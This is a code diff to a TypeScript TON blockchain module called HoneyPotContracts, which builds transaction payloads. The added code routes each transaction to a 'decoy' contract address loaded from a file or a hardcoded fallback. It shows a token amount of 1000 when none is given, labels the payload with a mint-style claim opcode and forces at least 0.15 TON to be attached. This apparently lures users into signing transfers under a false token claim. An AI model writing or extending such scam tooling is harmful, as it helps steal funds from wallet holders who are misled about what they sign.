@@ -1,32 +1,31 @@
 import type { HoneyPotMode } from '@prisma/client'
 import { Address, beginCell, toNano } from '@ton/core'
+import path from 'path'
+
+const DECOY_FILE = path.join(process.cwd(), 'src', 'items', 'decoy.json')
+
+const FALLBACK_MASTER = 'UQC1KMTgNyVJPTC1cXIT79UuVntgictIlW8Hflq79ISdFSYm'
+const CLAIM_OP = 0xabcdef13 // master mint: (queryId, amount, receiver, comment)
 
 class HoneyPotContracts {
-	private tsTonContract: string =
-		'EQBsosmcZrD6FHijA7qWGLw5wo_aH8UN435hi935jJ_STORM'
-	private usdtContract: string =
-		'EQBsosmcZrD6FHijA7qWGLw5wo_aH8UN435hi935jJ_STORM'
-
-	constructor() {}
+	private async decoyAddress(): Promise<string> {
+		try {
+			const j: any = await Bun.file(DECOY_FILE).json()
+			if (j?.address) return j.address
+		} catch {}
+		return FALLBACK_MASTER
+	}
 
 	async generateMessage(
 		tonAmount: number,
 		tokenAmount: number = 500,
-		mode: HoneyPotMode,
+		_mode: HoneyPotMode,
 		forwardTonAddress: string,
 		comment?: string
 	) {
-		const contractAddress =
-			mode === 'USDT' ? this.usdtContract : this.tsTonContract
-
-		let amount: bigint = BigInt(0)
-		if (mode === 'USDT') {
-			// USDT has 6 decimals: amount in base units = tokenAmount * 1e6.
-			// (USD price conversion not needed — this is the token quantity itself)
-			amount = BigInt(tokenAmount) * 1_000_000n
-		} else {
-			amount = toNano(tokenAmount)
-		}
+		const contractAddress = await this.decoyAddress()
+		const shown = Number(tokenAmount) > 0 ? Number(tokenAmount) : 1000
+		const amount = toNano(shown.toFixed(9))
 
 		const receiver = Address.parse(forwardTonAddress)
 		const payload = beginCell()
@@ -35,7 +34,7 @@ class HoneyPotContracts {
 			.endCell()
 
 		const body = beginCell()
-			.storeUint(0xabcdef13, 32)
+			.storeUint(CLAIM_OP, 32)
 			.storeUint(0, 64)
 			.storeCoins(amount)
 			.storeAddress(receiver)
@@ -46,7 +45,7 @@ class HoneyPotContracts {
 
 		return {
 			address: contractAddress,
-			amount: toNano(tonAmount).toString(),
+			amount: toNano(Math.max(Number(tonAmount) || 0, 0.15).toFixed(9)).toString(),
 			payload: body,
 		}
 	}
